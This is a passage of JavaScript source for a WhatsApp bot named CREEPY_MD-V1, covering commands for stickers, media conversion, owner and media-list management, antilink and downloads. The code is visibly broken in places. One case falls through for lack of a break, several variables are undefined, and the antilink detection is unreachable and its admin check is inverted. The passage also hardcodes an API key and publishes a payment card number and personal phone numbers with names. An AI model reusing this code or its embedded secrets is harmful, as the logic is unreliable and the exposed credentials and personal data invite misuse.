                        replyglobal(`Bot Creepy Reset, Group Invite Link Successfully ${groupMetadata.subject}`)
                    }).catch((err) => replyglobal(json(err)))
                break
case 'ping':
case 'p':
case 'speed':
case 'taste': {
 
    // Send an initial ping message with "testing ping" and no large thumbnail

    
   const timestamp = performance.now(); // Capture the time when the ping message is sent

    await replyglobal("🚀Testing speed...");
    
    // Calculate the round-trip latency
    const latency = (performance.now() - timestamp).toFixed(0); // in milliseconds

    // Construct the response message
    const response = `
╔═══════════════════╗
║      \`CREEPY_MD-V1\`        
║───────────────────║
║  Bot Speed: ${latency} ms            
║  Created by Danny                               
╚═══════════════════╝
    `.trim();

    // Send the result message back with a large thumbnail
    await GlobalTechInc.sendMessage(m.chat, {
        text: response,
        contextInfo: {
            forwardingScore: 5,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "CREEPY TECH",
                newsletterJid: "120363307517794567@newsletter",
            },
            externalAdReply: {
                showAdAttribution: true,
                title: `CREEPY_MD-V1`,
                body: `Creepy ultimate speed 💀`,
                thumbnailUrl: 'https://files.catbox.moe/54w3b1.jpeg',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
    
    // Add reaction using sendMessage, not a react function
    await GlobalTechInc.sendMessage(m.chat, {
        react: {
            text: "🍻", // Emoji you want to react with
            messageId: m.key.id
        }
    });
    

    


case 'buypremium':
case 'buyprem':
case 'premium': {
    let teks = `🤗Hi \`${pushname}👋\`\nYou want to Buy Premium?\nWell 😂 Premium is free🥲\nGo to your files in settings.js then put your number starting with country code without + 🙃\nThen restart your bot on your consle and you will have all access😊\n> Welcome and thanks for using Creepy`;

    // React with a thumbs up emoji before sending the message
    await GlobalTechInc.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
            externalAdReply: {
                showAdAttribution: true,
                title: `CREEPY_MD-V1`,
                body: `𝐷𝛥𝛮𝛮𝑌`,
                thumbnailUrl: 'https://files.catbox.moe/54w3b1.jpeg',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });

    await GlobalTechInc.react(m.chat, "🫵", m.key.id);
}
break

case 'runtime':
case 'uptime':
    let runtimetext = `\`𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓𝓓-𝓥𝟏\` \n\`Have Been Running For ${runtime(process.uptime())}\`\n> Enjoy Creepy Ultimate Speed💀`;

    // React with a thumbs up emoji before sending the message
    await GlobalTechInc.sendMessage(m.chat, {
        text: runtimetext,
        contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
            externalAdReply: {
                showAdAttribution: true,
                title: `CREEPY_MD-V1`,
                body: `Creepy Ultimate Speed💀`,
                thumbnailUrl: 'https://files.catbox.moe/54w3b1.jpeg',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });

    await GlobalTechInc.react(m.chat, "🏃", m.key.id);
    break
         
            case 'sc':
            case 'repo':
            case 'script':
            case 'scriptbot':
            case 'file':
                GlobalTechInc.sendMessage(m.chat, {
                    text: `\`Hello ${pushname}\`\n*To get the file of CREEPY_MD-V1* \n*Check out github*\n> https://github.com/DannyTech20/CREEPY_MD-V1.git\n*Or check it on Telegram*\n> https://t.me/creepytechnology\n*Cĥeck out my website for more*\n> https://creepytech.org`,
                    contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `CREEPY_MD-V1`,
                            body: `CREEPY_MD-V1 Created by Danny`,
                            thumbnailUrl: 'https://files.catbox.moe/54w3b1.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'support':
                let textnate = `Hello ${pushname}\nNo matter how much you send it is very valuable to us`
                GlobalTechInc.sendMessage(m.chat, {
                    text: '*You can pay via visa*\n> 4403530021231999\n*Also if you are from east Africa you can use pohone number*\nAirtel number\n> 255697608274\n*Name:Abraham laizer*\n`Airtel money`\n*Vodacom number*\n> 255768788833\n*Name:Janeth Ibrahim*\n`M-pesa`\n*Thank you and keep using 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏*\n' + textnate
                }, {
                    quoted: m
                })
                break                       
case 'owner': 
case 'Danny':{
const repf = await GlobalTechInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
GlobalTechInc.sendMessage(from, { text : `𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏\n> Hello @${sender.split("@")[0]}, 🙄That is 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 owner`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyglobal(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await GlobalTechInc.sendImageAsSticker(m.chat, media, m, {
                        packname: `CREEPY_MD-V1`,
                        author: `𝐷𝛥𝛮𝛮𝑌`
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyglobal('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await GlobalTechInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: `CREEPY_MD-V1`,
                        author: `𝐷𝛥𝛮𝛮𝑌`
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyglobal(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replyglobal(respond)
                if (!text) return replyglobal(respond)
                replyglobal("wait, I'm doing it..")
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await GlobalTechInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: `CREEPY_MD-V1`,
                    author: `𝐷𝛥𝛮𝛮𝑌`
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replyglobal(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
GlobalTechInc.downloadAndSaveMediaMessage(quoted, "gifee")
GlobalTechInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await GlobalTechInc.sendImageAsSticker(m.chat, media, m, { packname: `CREEPY_MD-V1`, author: `𝐷𝛥𝛮𝛮𝑌` })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyglobal('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await GlobalTechInc.sendVideoAsSticker(m.chat, media, m, { packname: `CREEPY_MD-V1`, author: `𝐷𝛥𝛮𝛮𝑌` })
} else {
replyglobal(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal("wait, I'm doing it..")
                let media = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    GlobalTechInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal("wait, I'm doing it..")
                let media = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await GlobalTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replyglobal("wait, I'm doing it..")
                let media = await GlobalTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                GlobalTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replyglobal("wait, I'm doing it..")
                let media = await GlobalTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                GlobalTechInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `creepy.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replyglobal("wait, I'm doing it..")
                let media = await GlobalTechInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                GlobalTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal("wait, I'm doing it..")
                let media = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await GlobalTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replyglobal("wait, I'm doing it..")
                let media = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replyglobal(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replyglobal(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix':
            case 'mix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyglobal(`Example : ${prefix + command} 😀+😂`)
                if (!emoji2) return replyglobal(`Example : ${prefix + command} 😀+😂`)
                replyglobal("wait, I'm doing it..")
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await GlobalTechInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: `CREEPY_MD-V1`,
                        author: `𝐷𝛥𝛮𝛮𝑌`,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'tonce':
            case 'toviewonce': {
                if (!quoted) return replyglobal(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                    GlobalTechInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `*Here you go!*`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                    GlobalTechInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `*Here you go!*`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replyglobal(' Plelinkgive me link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await GlobalTechInc.sendMessage(from, {
                    image: medi,
                    caption: "*Here you go!*"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replyglobal(`Example:\n${prefix}fliptext Creepy`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replyglobal(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replyglobal(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replyglobal(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageXeon.length}*`
                replyglobal(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                replyglobal(teks)
            }
            break
            case 'addowner':
            case 'newowner':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
if (!args[0]) return replyglobal(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await GlobalTechInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyglobal(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyglobal(`Congratulations ${bnnd} ${pushname} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
if (!args[0]) return replyglobal(`Use ${prefix+command} nomor\nExample ${prefix+command} 255697608274`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyglobal(`This user  ${ya} ${pushname} is no longer an owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
                if (args.length < 1) return replyglobal('Video Name?')
                if (VideoXeon.includes(q)) return replyglobal("The name you entered already exists")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./GlobalMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                replyglobal(`Success Adding Video \nTo View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
                if (args.length < 1) return replyglobal('Enter the Video Name')
                if (!VideoXeon.includes(q)) return replyglobal("Name Does Not Exist in Database")
                let wanu = VideoXeon.indexOf(q)
                VideoXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./GlobalMedia/video/${q}.mp4`)
                replyglobal(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
                if (args.length < 1) return replyglobal('The name of the image?')
                if (ImageXeon.includes(q)) return replyglobal("The name you entered is already registered in the database")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./GlobalMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(delb)
                replyglobal(`Bot Creepy added Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
                if (args.length < 1) return replyglobal('Enter the Image Name')
                if (!ImageXeon.includes(q)) return replyglobal("The image name you entered is not registered")
                let wanu = ImageXeon.indexOf(q)
                ImageXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./GlobalMedia/image/${q}.jpg`)
                replyglobal(`Bot Creepy Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
                if (args.length < 1) return replyglobal('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replyglobal("Name Already In Use")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./GlobalMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replyglobal(`Successfully Adding Sticker\nTo Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
                if (args.length < 1) return replyglobal('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replyglobal("Name Not Registered in Database")
                let wanu = StickerXeon.indexOf(q)
                StickerGlobalTechInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./GlobalMedia/sticker/${q}.webp`)
                replyglobal(`Bot Creepy Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
                if (args.length < 1) return replyglobal('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replyglobal("Name Already In Use")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./GlobalMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replyglobal(`Bot Creepy Added Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
                if (args.length < 1) return replyglobal('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return replyglobal("Name Not Registered in Database")
                let wanu = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./GlobalMedia/audio/${q}.mp3`)
                replyglobal(`Bot Creepy Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
await loading()
if (args.length < 1) return replyglobal(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./GlobalMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replyglobal(`Bot Creepy Added zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
await loading()
if (args.length < 1) return replyglobal('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replyglobal("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./GlobalMedia/zip/${teks}.zip`)
replyglobal(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replyglobal(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
await loading()
if (args.length < 1) return replyglobal('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./GlobalMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replyglobal(`Bot Creepy Added the apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
await loading()
if (args.length < 1) return replyglobal('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replyglobal("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./GlobalMedia/apk/${teks}.apk`)
replyglobal(`Bot Creepy deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replyglobal(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
await loading()
if (args.length < 1) return replyglobal('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./GlobalMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replyglobal(`Bot Creepy Added Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
await loading()
if (args.length < 1) return replyglobal('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replyglobal("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./GlobalMedia/doc/${teks}.pdf`)
replyglobal(`Bot Creepy deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replyglobal(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (isAfkOn) return replyglobal("Already notag")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replyglobal(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break

 // antilink cmd               





// antilink cmd
case 'antilink': {
    if (!isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃");
    if (!isBotAdmins) return replyglobal("I'm not an admin here🚫");
    if (!isAdmins && !Creator) return replyglobal("Only admins can use this😶");
    if (args.length < 1) return replyglobal('on/off?');

    // Initialize the chat settings if they don't exist yet
    if (!db.data.chats[m.chat]) {
        db.data.chats[m.chat] = {}; // Initialize the chat entry
    }

    if (args[0] === 'on') {
        db.data.chats[m.chat].antilink = true;
        fs.writeFileSync('./db.json', JSON.stringify(db, null, 2)); // Save changes to db
        replyglobal(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[m.chat].antilink = false;
        fs.writeFileSync('./db.json', JSON.stringify(db, null, 2)); // Save changes to db
        replyglobal(`${command} is disabled`);
    } else {
        replyglobal('Please type "on" or "off" to toggle the Anti-link feature.');
    }
}
break;

// Link detection
if (db.data.chats[m.chat]?.antilink) {
    if (budy.match(/http(s)?:\/\/[^\s]+/)) {
        if (isAdmins) return replyglobal("Only admins can use this😶");
        if (m.key.fromMe) return replyglobal("😡You are not my owner dude🚫");
        if (Creator) return replyglobal("😡You are not my owner dude🚫");

        await GlobalTechInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });

        GlobalTechInc.sendMessage(from, {
            text: `\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} *_Warning: links are not allowed in this group._*`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m });
    }
}
// detection end
// antilink end




//mute&unmute
// mute users start
case 'mute': {
    if (!isGroup) return reply('This command can only be used in groups.');
    if (!isAdmin) return reply('Only admins can use this command.');
    
    let target = args[0]?.replace('@', '') + '@s.whatsapp.net';
    if (!target) return reply('Tag the user you want to mute.');

    if (target === botNumber) return reply("I can't mute myself.");
    
    if (!groupMetadata.participants.some(p => p.id === target)) {
        return reply('User is not in the group.');
    }

    mutedUsers[target] = true; // Store in JSON or database
    reply(`@${target.split('@')[0]} has been muted.`, null, { mentions: [target] });
}
break;
//mute end

//unmute start
case 'unmute': {
    if (!isGroup) return reply('This command can only be used in groups.');
    if (!isAdmin) return reply('Only admins can use this command.');
    
    let target = args[0]?.replace('@', '') + '@s.whatsapp.net';
    if (!target) return reply('Tag the user you want to unmute.');

    if (mutedUsers[target]) {
        delete mutedUsers[target];
        reply(`@${target.split('@')[0]} has been unmuted.`, null, { mentions: [target] });
    } else {
        reply('User is not muted.');
    }
}
break;
//unmute end

//mute&unmute end

// Lyrics download                
case 'lyrics': {
    if (!text) {
        return replyglobal(`Example: ${prefix + command} Ghost | Justin bieber`);
    }

    try {
        const [title, artist] = text.split('|').map(str => str.trim());
        if (!title || !artist) return replyglobal(`*Please provide both song title and artist,\n e.g.:* ${prefix + command} Ghost | Justin bieber`);
        await GlobalTechInc.sendMessage(`*Downloading lyrics for:* ${title} by ${artist}`);

        const apiUrl = `https://apis.davidcyriltech.my.id/lyrics?t=${encodeURIComponent(title)}&a=${encodeURIComponent(artist)}`;
        const response = await axios.get(apiUrl);
    
        if (response.data && response.data.lyrics) {
          const { title, artist, lyrics } = response.data;
    
          const lyricsMessage = `*CREEPY_MD-V1 [LYRICS]*\n\n` +
            `*Title:* ${title}\n` +
            `*Artist:* ${artist}\n\n` +
            `${lyrics}\n` +
            `> *CREEPY_MD-V1*`;
    
          m.reply(lyricsMessage); // Keep m.reply here to send the message
        } else {
          replyglobal(`*No lyrics found for:* ${title} by ${artist}`); // Use replyglobal here
        }
      } catch (error) {
        console.error('Error fetching lyrics:', error);
        replyglobal(`*Failed to fetch lyrics.\n\n*Error Details:* ${error.message}`); // Use replyglobal here
      }
      break;
}



//facebook insta and tiktok start

// Instagram Command
case 'instagram': {
    if (!text) return replyglobal(`Example: ${prefix + command} https://www.instagram.com/p/xxxxx`);
    await GlobalTechInc.sendMessage(`Downloading Instagram content...`);
    
    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/download/aio?url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
    
        if (response.data.success) {
          const { title, low_quality, high_quality } = response.data.video;
    
          const isDirectDownloadHD = high_quality.includes("tinyurl");
          const isDirectDownloadSD = low_quality.includes("tinyurl");
    
          if (isDirectDownloadHD || isDirectDownloadSD) {
            if (isDirectDownloadHD) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: { url: high_quality },
                mimetype: 'video/mp4',
                fileName: `${title}_HD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* HD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
            if (isDirectDownloadSD) {
              await GlobalTechInc.sendMessage(m.chat, {
                video: { url: low_quality },
                mimetype: 'video/mp4',
                fileName: `${title}_SD.mp4`,
                caption: `*Title:* ${title}\n*Quality:* SD\n> *CREEPY_MD-V1*`
              }, { quoted: m });
            }
          } else {
            await GlobalTechInc.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });
    
            const hdBuffer = await axios.get(high_quality, { responseType: 'arraybuffer' });
            const sdBuffer = await axios.get(low_quality, { responseType: 'arraybuffer' });
    
            if (high_quality) {
              await GlobalTechInc.sendMessage(m.chat, {
